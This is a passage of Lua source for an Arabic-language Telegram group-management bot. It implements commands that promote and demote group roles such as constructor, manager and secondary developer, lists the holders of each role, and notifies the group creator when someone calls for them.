https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/'..UserName..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NameChat = dp.title_
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub("'","") 
local NameChat = NameChat:gsub("","") 
local NameChat = NameChat:gsub("*","") 
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","") 
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if LinkGp.ok == true then 
LinkGroup = LinkGp.result
else
LinkGroup = 'لا يوجد'
end
sendText(b.id_," ♤ مرحبا عزيزي المنشئ هناك شخص يريدك \n ♤ الشخص  {"..Name.."}\n ♤ اسم الجروب {"..NameChat.."}\n ♤ ايدي الجروب { `"..msg.chat_id_.."` }\n ♤ رابط الجروب \n [ "..LinkGroup.." ]\n    ♤ رابط الرساله \n https://t.me/c/"..chatid.."/"..msg_id.."   ",0,'md')
end,nil)
end,nil)
end,nil)
end
end
end,nil)
end
if text == "رفع منشئ" and msg.reply_to_message_id_ and BasicConstructor(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ♤ لا تستطيع استخدام البوت \n ♤  يرجى الاشتراك بالقناه اولا \n ♤  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Constructor'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ♤  الـعـضو   ⇦♤['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n ♤ تم ترقيته منشئ'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
end
if text and text:match("^رفع منشئ @(.*)$") and BasicConstructor(msg) then
local username = text:match("^رفع منشئ @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ♤ لا تستطيع استخدام البوت \n ??  يرجى الاشتراك بالقناه اولا \n ♤  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_," ♤ عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
database:sadd(bot_id..'Constructor'..msg.chat_id_, result.id_)
usertext = '\n ♤ الـعـضو   ⇦♤['..result.title_..'](t.me/'..(username or 'textchuser')..')'
status  = '\n ♤ تم ترقيته منشئ'
texts = usertext..status
else
texts = ' ♤ لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
end
------------------------------------------------------------------------
if text and text:match("^رفع منشئ (%d+)$") and BasicConstructor(msg) then
local userid = text:match("^رفع منشئ (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ♤ لا تستطيع استخدام البوت \n ♤  يرجى الاشتراك بالقناه اولا \n ♤  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:sadd(bot_id..'Constructor'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ♤ الـعـضو   ⇦♤['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n ♤ تم ترقيته منشئ'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ♤  الـعـضو   ⇦♤'..userid..''
status  = '\n ♤ تم ترقيته منشئ'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
end
if text and text:match("^تنزيل منشئ$") and msg.reply_to_message_id_ and BasicConstructor(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ♤ لا تستطيع استخدام البوت \n ♤  يرجى الاشتراك بالقناه اولا \n ♤  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Constructor'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ♤ الـعـضو   ⇦♤['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n ♤ تم تنزيله من المنشئين'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
end
------------------------------------------------------------------------
if text and text:match("^تنزيل منشئ @(.*)$") and BasicConstructor(msg) then
local username = text:match("^تنزيل منشئ @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ♤ لا تستطيع استخدام البوت \n ♤  يرجى الاشتراك بالقناه اولا \n ♤  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
database:srem(bot_id..'Constructor'..msg.chat_id_, result.id_)
usertext = '\n ♤ الـعـضو   ⇦♤['..result.title_..'](t.me/'..(username or 'textchuser')..')'
status  = '\n ♤ تم تنزيله من المنشئين'
texts = usertext..status
else
texts = ' ♤ لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
end
------------------------------------------------------------------------
if text and text:match("^تنزيل منشئ (%d+)$") and BasicConstructor(msg) then
local userid = text:match("^تنزيل منشئ (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ♤ لا تستطيع استخدام البوت \n ♤  يرجى الاشتراك بالقناه اولا \n ♤  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:srem(bot_id..'Constructor'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ♤ الـعـضو   ⇦♤['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n ♤ تم تنزيله من المنشئين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ♤ الـعـضو   ⇦♤'..userid..''
status  = '\n ♤ تم تنزيله من المنشئين'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
end
------------------------------------------------------------------------
if text == 'مسح المدراء' and Constructor(msg) then
database:del(bot_id..'Manager'..msg.chat_id_)
texts = ' ♤ تم مسح المدراء '
send(msg.chat_id_, msg.id_, texts)
end
if text == ("المدراء") and Constructor(msg) then
local list = database:smembers(bot_id..'Manager'..msg.chat_id_)
t = "\n ♤ قائمة المدراء \n⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = " ♤ لا يوجد مدراء"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("تاك للمدراء") or text == ("صيح المدراء") then
local list = database:smembers(bot_id..'Manager'..msg.chat_id_)
t = "\n ♤ وينكم تعالو يريدوكم بالجروب \n⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- {[@"..username.."]}\n"
else
t = t..""..k.."- ♤ '..v..' ♤\n"
end
end
if #list == 0 then
t = " ♤ لا يوجد مدراء"
end
send(msg.chat_id_, msg.id_, t)
end

if text == ("رفع مدير") and msg.reply_to_message_id_ and Constructor(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ♤ لا تستطيع استخدام البوت \n ♤  يرجى الاشتراك بالقناه اولا \n ♤  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Manager'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ♤ الـعـضو   ⇦♤['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n ♤ تم ترقيته مدير'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end  
if text and text:match("^رفع مدير @(.*)$") and Constructor(msg) then
local username = text:match("^رفع مدير @(.*)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ♤ لا تستطيع استخدام البوت \n ♤  يرجى الاشتراك بالقناه اولا \n ♤  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_," ♤ عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
database:sadd(bot_id..'Manager'..msg.chat_id_, result.id_)
usertext = '\n ♤ الـعـضو   ⇦♤['..result.title_..'](t.me/'..(username or 'textchuser')..')'
status  = '\n ♤ تم ترقيته مدير'
texts = usertext..status
else
texts = ' ♤ لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end 

if text and text:match("^رفع مدير (%d+)$") and Constructor(msg) then
local userid = text:match("^رفع مدير (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ♤ لا تستطيع استخدام البوت \n ♤  يرجى الاشتراك بالقناه اولا \n ♤  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:sadd(bot_id..'Manager'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ♤ الـعـضو   ⇦♤['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n ♤ تم ترقيته مدير'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ♤ الـعـضو   ⇦♤'..userid..''
status  = '\n ♤ تم ترقيته مدير'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end  
if text == ("تنزيل مدير") and msg.reply_to_message_id_ and Constructor(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ♤ لا تستطيع استخدام البوت \n ♤  يرجى الاشتراك بالقناه اولا \n ♤  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Manager'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ♤ الـعـضو   ⇦♤['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n ♤ تم تنزيله من المدراء'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end  
if text and text:match("^تنزيل مدير @(.*)$") and Constructor(msg) then
local username = text:match("^تنزيل مدير @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ♤ لا تستطيع استخدام البوت \n ♤  يرجى الاشتراك بالقناه اولا \n ♤  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
database:srem(bot_id..'Manager'..msg.chat_id_, result.id_)
usertext = '\n ♤ الـعـضو   ⇦♤['..result.title_..'](t.me/'..(username or 'textchuser')..')'
status  = '\n ♤ تم تنزيله من المدراء'
texts = usertext..status
else
texts = ' ♤ لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end  
if text and text:match("^تنزيل مدير (%d+)$") and Constructor(msg) then
local userid = text:match("^تنزيل مدير (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ♤ لا تستطيع استخدام البوت \n ♤  يرجى الاشتراك بالقناه اولا \n ♤  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:srem(bot_id..'Manager'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ♤ الـعـضو   ⇦♤['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n ♤ تم تنزيله من المدراء'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ♤ الـعـضو   ⇦♤'..userid..''
status  = '\n ♤ تم تنزيله من المدراء'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end

if text == ("رفع مساعد") and tonumber(msg.reply_to_message_id_) ~= 0 and SudoBot(msg) then
function Function_DRAGON(extra, result, success)
database:del(bot_id.."msa3d:ban")
database:sadd(bot_id.."msa3d:ban", result.sender_user_id_)
database:set(bot_id.."id:msa3d:ban", result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply"," ♤ تم ترقيته مساعد في البوت")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_DRAGON, nil)
return false 
end
if text and text:match("^رفع مساعد @(.*)$") and SudoBot(msg) then
local username = text:match("^رفع مساعد @(.*)$")
function Function_DRAGON(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_," ♤ عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
database:del(bot_id.."msa3d:ban")
database:sadd(bot_id.."msa3d:ban", result.id_)
database:set(bot_id.."id:msa3d:ban", result.id_)
Reply_Status(msg,result.id_,"reply"," ♤ تم ترقيته مساعد في البوت")  
else
send(msg.chat_id_, msg.id_," ♤ لا يوجد حساب بهاذا المعرف")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_DRAGON, nil)
return false 
end
if text and text:match("^رفع مساعد (%d+)$") and SudoBot(msg) then
local userid = text:match("^رفع مساعد (%d+)$")
database:del(bot_id.."msa3d:ban")
database:sadd(bot_id.."msa3d:ban", userid)
database:set(bot_id.."id:msa3d:ban", userid)
Reply_Status(msg,userid,"reply"," ♤ تم ترقيته مساعد في البوت")  
return false 
end
if text == ("تنزيل المساعد") and SudoBot(msg) then
function Function_DRAGON(extra, result, success)
local id = database:get(bot_id.."id:msa3d:ban")
Reply_Status(msg,id,"reply"," ♤ تم تنزيله من المساعد")  
database:del(bot_id.."msa3d:ban")
database:del(bot_id.."id:msa3d:ban")
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_DRAGON, nil)
return false 
end
if text == ("تنزيل مساعد") and SudoBot(msg) then
function Function_DRAGON(extra, result, success)
local id = database:get(bot_id.."id:msa3d:ban")
Reply_Status(msg,id,"reply"," ♤ تم تنزيله من المساعد")  
database:del(bot_id.."msa3d:ban")
database:del(bot_id.."id:msa3d:ban")
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_DRAGON, nil)
return false 
end
if text == "المساعد" or text == "مساعد" then
local id = database:get(bot_id.."id:msa3d:ban")
local urrl = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..id)
local json = JSON.decode(urrl)
local name = json.result.first_name
if json.result.username then
username = json.result.username
else
username = 'eLmLoK0'
end
local Name = ' المساعد'..name..'\n'
keyboard = {} 
keyboard.inline_keyboard = {{{text = name, url="t.me/"..username}},}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/'..username..'&caption=' .. URL.escape(Name).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
------------------------------------------------------------------------ adddev2 sudog
if text == ("رفع مطور ثانوي") and tonumber(msg.reply_to_message_id_) ~= 0 and SudoBot(msg) then
function Function_DRAGON(extra, result, success)
database:sadd(bot_id.."Dev:SoFi:2", result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","♤ تم ترقيته مطور ثانوي في البوت")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_DRAGON, nil)
return false 
end
if text and text:match("^رفع مطور ثانوي @(.*)$") and SudoBot(msg) then
local username = text:match("^رفع مطور ثانوي @(.*)$")
function Function_DRAGON(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"♤ عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
database:sadd(bot_id.."Dev:SoFi:2", result.id_)
Reply_Status(msg,result.id_,"reply","♤ تم ترقيته مطور ثانوي في البوت")  
else
send(msg.chat_id_, msg.id_,"♤ لا يوجد حساب بهاذا المعرف")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_DRAGON, nil)
return false 
end
if text and text:match("^رفع مطور ثانوي (%d+)$") and SudoBot(msg) then
local userid = text:match("^رفع مطور ثانوي (%d+)$")
database:sadd(bot_id.."Dev:SoFi:2", userid)
Reply_Status(msg,userid,"reply","♤ تم ترقيته مطور ثانوي في البوت")  
return false 
end
if text == ("تنزيل مطور ثانوي") and tonumber(msg.reply_to_message_id_) ~= 0 and SudoBot(msg) then
function Function_DRAGON(extra, result, success)
database:srem(bot_id.."Dev:SoFi:2", result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","♤ تم تنزيله من المطور ثانويين")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_DRAGON, nil)
return false 
end
if text and text:match("^تنزيل مطور ثانوي @(.*)$") and SudoBot(msg) then
local username = text:match("^تنزيل مطور ثانوي @(.*)$")
function Function_DRAGON(extra, result, success)
if result.id_ then
database:srem(bot_id.."Dev:SoFi:2", result.id_)
Reply_Status(msg,result.id_,"reply","♤ تم تنزيله من المطور ثانويين")  
else
send(msg.chat_id_, msg.id_,"♤ لا يوجد حساب بهاذا المعرف")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_DRAGON, nil)
return false
end  
if text and text:match("^تنزيل مطور ثانوي (%d+)$") and SudoBot(msg) then
local userid = text:match("^تنزيل مطور ثانوي (%d+)$")
database:srem(bot_id.."Dev:SoFi:2", userid)
Reply_Status(msg,userid,"reply","♤ تم تنزيله من المطور ثانويين")  
return false 
end
if text == ("الثانوين") and SudoBot(msg) then
local list = database:smembers(bot_id.."Dev:SoFi:2")
t = "\n ♤  قائمة مطورين الثانويين للبوت \n⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = " ♤  لا يوجد مطورين ثانويين"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("مسح الثانوين") and SudoBot(msg) then
database:del(bot_id.."Dev:SoFi:2")
send(msg.chat_id_, msg.id_, "\n ♤ تم مسح قائمة المطورين الثانوين  ")
end
------------------------------------------------------------------------
if text == ("رفع مدير عام") and msg.reply_to_message_id_ and Constructor(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ♤ لا تستطيع استخدام البوت \n ♤  يرجى الاشتراك بالقناه اولا \n ♤  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'onall'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ♤ الـعـضو   ⇦♤['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n ♤ تم ترقيته مدير عام'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end  
if text and text:match("^رفع مدير عام @(.*)$") and Constructor(msg) then
local username = text:match("^رفع مدير عام @(.*)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ♤ لا تستطيع استخدام البوت \n ♤  يرجى الاشتراك بالقناه اولا \n ♤  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_," ♤ عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
database:sadd(bot_id..'onall'..msg.chat_id_, result.id_)
usertext = '\n ♤ الـعـضو   ⇦♤['..result.title_..'](t.me/'..(username or 'textchuser')..')'
status  = '\n ♤ تم ترقيته مدير عام'
texts = usertext..status
else
texts = ' ♤ لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end 

if text and text:match("^رفع مدير عام (%d+)$") and Constructor(msg) then
local userid = text:match("^رفع مدير عام (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ♤ لا تستطيع استخدام البوت \n ♤  يرجى الاشتراك بالقناه اولا \n ♤  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:sadd(bot_id..'onall'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ♤ الـعـضو   ⇦♤['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n ♤ تم ترقيته مدير عام'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ♤ الـعـضو   ⇦♤'..userid..''
status  = '\n ♤ تم ترقيته مدير عام'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end  
if text == ("تنزيل مدير عام") and msg.reply_to_message_id_ and Constructor(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ♤ لا تستطيع استخدام البوت \n ♤  يرجى الاشتراك بالقناه اولا \n ♤  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'onall'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ♤ الـعـضو   ⇦♤['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n ♤ تم تنزيله من المدراء'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end  
if text and text:match("^تنزيل مدير عام @(.*)$") and Constructor(msg) then
local username = text:match("^تنزيل مدير عام @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ♤ لا تستطيع استخدام البوت \n ♤  يرجى الاشتراك بالقناه اولا \n ♤  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
database:srem(bot_id..'onall'..msg.chat_id_, result.id_)
usertext = '\n ♤ الـعـضو   ⇦♤['..result.title_..'](t.me/'..(username or 'textchuser')..')'
status  = '\n ♤ تم تنزيله من المدراء'
texts = usertext..status
else
texts = ' ♤ لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end  
if text and text:match("^تنزيل مدير عام (%d+)$") and Constructor(msg) then
local userid = text:match("^تنزيل مدير عام (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ♤ لا تستطيع استخدام البوت \n ♤  يرجى الاشتراك بالقناه اولا \n ♤  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:srem(bot_id..'onall'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ♤ الـعـضو   ⇦♤['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n ♤ تم تنزيله من المدراء'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ♤ الـعـضو   ⇦♤'..userid..''
status  = '\n ♤ تم تنزيله من المدراء'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
------------------------------------------------------------------------
if text == ("رفع ادمن عام") and msg.reply_to_message_id_ and Constructor(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ♤ لا تستطيع استخدام البوت \n ♤  يرجى الاشتراك بالقناه اولا \n ♤  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'moall'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ♤ الـعـضو   ⇦♤['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n ♤ تم ترقيته ادمن عام'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end  
